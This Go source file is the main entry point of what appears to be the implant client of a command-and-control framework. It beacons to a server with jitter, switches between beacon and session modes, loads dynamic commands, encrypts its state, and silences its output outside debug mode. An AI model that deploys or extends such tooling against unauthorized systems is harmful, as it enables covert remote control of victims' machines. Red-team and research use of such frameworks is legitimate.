package main

import (
	"fmt"
	stlog "log"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"

	beaconHandler "src/Client/beacon/beaconHandler"
	httpFuncs "src/Client/beacon/http"
	"src/Client/generic/config"
	"src/Client/generic/interpreter_client"
	"src/Client/generic/logger"
	"src/Client/generic/stateEncryption"
	"src/Client/session"
)

// --- Output Suppression Utility ---
var originalStdout *os.File
var originalStderr *os.File

// suppressOutput redirects stdout and stderr to /dev/null (or NUL on Windows).
func suppressOutput() {
	originalStdout = os.Stdout
	originalStderr = os.Stderr
	devNull, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0755)
	if err != nil {
		// Use standard log here as our custom logger might be suppressed
		stlog.Fatalf("Failed to open %s: %v", os.DevNull, err)
	}
	os.Stdout = devNull
	os.Stderr = devNull

	// Also redirect the standard Go logger if it's used inadvertently elsewhere
	stlog.SetOutput(devNull)
}

func beacon() {
	logger.Log("[Main] ========== BEACON MODE STARTING ==========")

	// Validate beacon URL is configured before attempting to beacon
	url, err := config.GetURL()
	if err != nil {
		logger.Error(fmt.Sprintf("[Main] Failed to get beacon URL: %v", err))
		logger.Error("[Main] Cannot enter beacon mode without a valid URL configuration")
		return
	}
	if url == "" || url == ":" || url == "http://:" || url == "https://:" {
		logger.Error("[Main] Beacon URL is not configured or invalid")
		logger.Error("[Main] Cannot enter beacon mode without a valid URL")
		logger.Error("[Main] If switching from session mode, ensure beacon server URL is configured")
		return
	}
	logger.Log(fmt.Sprintf("[Main] Beacon URL validated: %s", url))

	for count := 0; count < config.MaxRetries; count++ {
		logger.Log(fmt.Sprintf("[Main] Starting new iteration %d/%d", count+1, config.MaxRetries))

		// Get config values safely (auto-decrypts if needed)
		currentID, errID := config.GetID()
		if errID != nil {
			logger.Error(fmt.Sprintf("[Main] Failed to get ID: %v", errID))
			currentID = ""
		}
		currentURL, errURL := config.GetURL()
		if errURL != nil {
			logger.Error(fmt.Sprintf("[Main] Failed to get URL: %v", errURL))
			currentURL = "http://localhost:" + config.URLPort
		}
		if currentURL == "" {
			currentURL = "http://localhost:" + config.URLPort
			logger.Warn(fmt.Sprintf("[Main] URL was empty, using default: %s", currentURL))
		}

		if currentID != "" && config.Jitter != -1 && config.Timer != -1 {
			logger.Log("[Main] HTTP Reconnect mode - ID, Jitter, and Timer are set")
			responseCode, _, Err := httpFuncs.HTTPReconnect(currentURL, currentID, config.Jitter, config.Timer)

			if Err != nil {
				logger.Error(fmt.Sprintf("[Main] Critical error during HTTP reconnect: %v", Err))
				os.Exit(1)
			}
			if responseCode == -1 {
				logger.Log("[Main] HTTP Reconnect indicated recoverable failure, retrying...")
				time.Sleep(5 * time.Second)
				continue
			}
			config.URL = currentURL
			logger.Log("[Main] URL set to " + config.URL)
		} else {
			logger.Log("[Main] HTTP Connect mode - establishing new connection")

			connTimer, connID, connJitter, err := httpFuncs.HTTPConnection(currentURL)

			if err != nil {
				logger.Error(fmt.Sprintf("[Main] Critical error establishing HTTP connection: %v", err))
				os.Exit(1)
			}
			if connTimer == -1 {
				logger.Log("[Main] HTTP Connection indicated recoverable failure, retrying...")
				time.Sleep(5 * time.Second)
				continue
			}

			config.Timer = connTimer
			logger.Log("[Main] Timer set to " + strconv.FormatFloat(config.Timer, 'f', -1, 64))
			config.ID = connID
			logger.Log("[Main] ID set to " + config.ID)
			config.Jitter = connJitter
			logger.Log("[Main] Jitter set to " + strconv.FormatFloat(config.Jitter, 'f', -1, 64))
			config.URL = currentURL
			logger.Log("[Main] URL set to " + config.URL)
		}

		logger.Log("[Main] Calling beacon handler")
		var beaconStatus int
		err, switchSession := beaconHandler.Beacon()
		if err != nil {
			logger.Error(fmt.Sprintf("[Main] Critical error during beacon: %v", err))
			os.Exit(1)
		}
		if switchSession {
			logger.Log("[Main] Switching to session mode")
			err, switchBeacon := session.SessionHandler()
			if err != nil {
				logger.Error(fmt.Sprintf("[Main] Session handler error: %v", err))
			}
			if switchBeacon {
				logger.Log("[Main] Session requested switch back to beacon mode")
				logger.Log("[Main] Continuing beacon reconnect pathway...")
			}
			continue
		}

		if beaconStatus == -1 {
			logger.Log("[Main] Beaconing failed (recoverable), retrying...")
			time.Sleep(5 * time.Second)
			continue
		}

	}
	logger.Log("[Main] ========== BEACON MODE ENDED ==========")
}

func main() {
	logger.Log("[Main] ========================================")
	logger.Log("[Main] ======= PROMETHEAN PROXY CLIENT =======")
	logger.Log("[Main] ========================================")

	if config.IsDebug() {
		logger.Warn("[Main] DEBUG MODE ENABLED")
	}

	logger.Warn("[Main] Program Starting")
	logger.Log("[Main] Initializing state encryption system...")

	// Enable debug mode for state encryption if client debug is enabled
	if config.IsDebug() {
		stateEncryption.SetDebugMode(true)
		logger.Log("[Main] State encryption debug mode enabled")
	}

	// Setup signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		sig := <-sigChan
		logger.Warn(fmt.Sprintf("[Main] Received signal: %v", sig))
		logger.Log("[Main] Performing graceful shutdown...")

		// Encrypt state before exit
		logger.Log("[Main] Encrypting state before shutdown")
		if err := config.EncryptConfigState(); err != nil {
			logger.Error(fmt.Sprintf("[Main] Failed to encrypt state on shutdown: %v", err))
		} else {
			logger.Log("[Main] State encrypted successfully")
		}

		// Clear master key
		logger.Log("[Main] Clearing master encryption key")
		stateEncryption.ClearMasterKey()
		logger.Log("[Main] Master key cleared")

		logger.Warn("[Main] Graceful shutdown complete")
		os.Exit(0)
	}()

	logger.Log("[Main] Signal handlers configured")

	if !config.IsDebug() {
		suppressOutput()
	}

	// Print list of loaded dynamic commands
	cmds := interpreter_client.ListDynamicCommands()
	logger.Log(fmt.Sprintf("[Main] Loaded dynamic commands: %v", cmds))
	logger.Log(fmt.Sprintf("[Main] Number of loaded commands: %d", len(cmds)))

	logger.Log(fmt.Sprintf("[Main] Primary connection method: %s", config.PrimaryConnectionMethod))

	switch config.PrimaryConnectionMethod {
	case "session":
		logger.Log("[Main] Session mode is the primary connection type.")
		logger.Log("[Main] Starting session handler...")
		err, switchBeacon := session.SessionHandler()
		if err != nil {
			logger.Error(fmt.Sprintf("[Main] Session handler error: %v", err))
		}
		if switchBeacon {
			logger.Log("[Main] Session requested switch to beacon mode")
			logger.Log("[Main] Following reconnect pathway via beacon mode...")
			beacon()
		}
	case "beacon":
		logger.Log("[Main] Beacon mode is the primary connection type.")
		logger.Log("[Main] Starting beacon mode...")
		beacon()
	default:
		logger.Warn(fmt.Sprintf("[Main] Unknown primary connection type: %s, defaulting to beacon mode.", config.PrimaryConnectionMethod))
		logger.Log("[Main] Starting beacon mode (default)...")
		beacon()
	}

	// Encrypt state before program exit
	logger.Log("[Main] Program ending, encrypting final state")
	if err := config.EncryptConfigState(); err != nil {
		logger.Error(fmt.Sprintf("[Main] Failed to encrypt state on exit: %v", err))
	} else {
		logger.Log("[Main] Final state encrypted successfully")
	}

	// Clear master key
	logger.Log("[Main] Clearing master encryption key before exit")
	stateEncryption.ClearMasterKey()

	logger.Warn("[Main] ========================================")
	logger.Warn("[Main] ======= PROGRAM TERMINATED ============")
	logger.Warn("[Main] ========================================")
}
